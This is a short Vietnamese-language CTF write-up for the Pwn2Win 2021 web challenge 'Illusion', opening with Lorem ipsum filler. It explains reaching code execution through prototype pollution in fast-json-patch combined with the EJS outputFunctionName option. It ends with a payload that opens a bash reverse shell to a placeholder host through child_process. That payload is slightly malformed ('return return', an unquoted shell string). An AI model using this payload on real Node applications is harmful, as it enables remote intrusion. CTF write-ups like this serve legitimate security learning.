---
layout: post
title: "[WRITEUP PWN2WINCTF 2021]: WEB - test by anho"
categories: CTF
toc: true
---

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.

## Challenge Illusion

- Source: [illusion](https://github.com/DauHoangTai/CTF/tree/master/2021/Pwn2win/illusion)

### Overview

- Trang web chỉ hiện thị các service nào đang online và offline nhưng ở đây tất cả đều online. Cấu trúc của folder chứa challenge mà author cung cấp thì chúng ta thấy có file `flag.txt` và `readflag` nhưng nó không được gọi ra ở bất kì đâu => có lẽ phải RCE để thực thi file `readflag`.

### Analysis Source

- Nhìn vào source thì thấy có 1 endpoint `change_status` là có thể khai thác. 
![image](https://user-images.githubusercontent.com/54855855/121309532-7c888d80-c92c-11eb-8687-73a2225375f0.png)
Ở đoạn code này chương trình nhận input của người dùng thông qua method post sau đó kiểm tra tham số người dùng truyền vào nếu như `service=='status'` thì return về 400, nếu không thì sẽ push vào array path (option ở đây là repace nên sẽ thay thế value của tham số đó luôn chứ không phải thêm vào). Cuối cùng nó sẽ thay đổi các giá trị trong mảng của services (được khai báo ban đầu) bằng các giá trị ở trong mảng pacth và return về sercives đó.
- Ở endpoint `/` thì thấy được nó lấy mảng servirces để render qua file `index.js` mà không hề được lọc đầu vào cùa người dùng.
- File `index.ejs` thì sẽ in ra các value của services.
=> chúng ta có thể dựa vào cách nó in ra thẳng input của người dùng mà không xử lí đầu vào => prototype pollution attack.

### Solution

- Ở bài này chúng ta không thể gọi prototype như bình thường vì nó bị chặn. Sau khi tìm kiếm thì phát hiện ở thư viện ` fast-json-patch` gần đây có thể tấn công prototype pollution
link: https://github.com/418sec/huntr/pull/768
- Sử dụng nó kèm theo hàm `outputFunctionName` ở trong node js có thể rce
Vậy bây giờ ta chỉ cần sử dụng nó và RCE để lấy flag.

### Payload

```js
constructor/prototype/outputFunctionName='x; return return global.process.mainModule.constructor._load("child_process").execSync(bash -c "bash -i >& /dev/tcp/host/port 0>&1");'
```
